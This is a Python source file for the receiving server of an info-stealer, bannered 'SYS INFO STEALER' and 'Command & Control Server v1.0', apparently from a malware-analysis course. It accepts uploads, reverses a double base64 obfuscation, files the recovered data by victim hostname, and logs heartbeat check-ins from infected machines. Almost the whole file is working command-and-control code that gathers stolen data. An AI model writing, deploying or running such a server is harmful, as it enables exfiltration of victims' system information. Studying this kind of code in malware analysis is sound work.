import http.server
import json
import base64
import os
from datetime import datetime
from urllib.parse import urlparse

UPLOAD_DIR = "Collected_Data"
os.makedirs(UPLOAD_DIR, exist_ok=True)

class RequestHandler(http.server.BaseHTTPRequestHandler):
    
    def do_POST(self):
        if self.path == '/upload':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data)
                obfuscated = data.get('data', '')
                
                step1 = base64.b64decode(obfuscated).decode()[::-1]
                step2 = base64.b64decode(step1).decode()
                original_data = json.loads(step2)
                
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                hostname = data.get('hostname', 'unknown')
                filename = f"{UPLOAD_DIR}/{hostname}_{timestamp}.json"
                
                with open(filename, 'w') as f:
                    json.dump(original_data, f, indent=2)
                
                print(f"[+] Received data from {hostname} - Saved to {filename}")
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode())
                
            except Exception as e:
                print(f"[-] Error processing data: {e}")
                self.send_response(400)
                self.end_headers()
                self.wfile.write(json.dumps({"status": "error", "reason": str(e)}).encode())
    
    def do_GET(self):
        if self.path == '/heartbeat':
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] Heartbeat received from {self.client_address[0]}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        else:
            self.send_response(404)
            self.end_headers()

def print_banner():
    banner = """
╔═════════════════════════════════════════════════════════════════╗
║                                                                 ║
║   ███████╗██╗   ██╗███████╗    ██╗███╗   ██╗███████╗ ██████╗    ║
║   ██╔════╝╚██╗ ██╔╝██╔════╝    ██║████╗  ██║██╔════╝██╔═══██╗   ║
║   ███████╗ ╚████╔╝ ███████╗    ██║██╔██╗ ██║█████╗  ██║   ██║   ║
║   ╚════██║  ╚██╔╝  ╚════██║    ██║██║╚██╗██║██╔══╝  ██║   ██║   ║
║   ███████║   ██║   ███████║    ██║██║ ╚████║██║     ╚██████╔╝   ║
║   ╚══════╝   ╚═╝   ╚══════╝    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝    ║
║                                                                 ║
║    ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗     ║
║    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗    ║
║    ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝    ║
║    ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗    ║
║    ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║    ║
║    ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝    ║
║                                                                 ║
║             Command & Control Server v1.0                       ║
║             Fundamentals of Malware Analysis                    ║
╚═════════════════════════════════════════════════════════════════╝
    """
    print(banner)

if __name__ == '__main__':
    print_banner()
    server = http.server.HTTPServer(('0.0.0.0', 8080), RequestHandler)
    print("[*] C2 Server started on port 8080...")
    print("[*] Waiting for connections...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped.")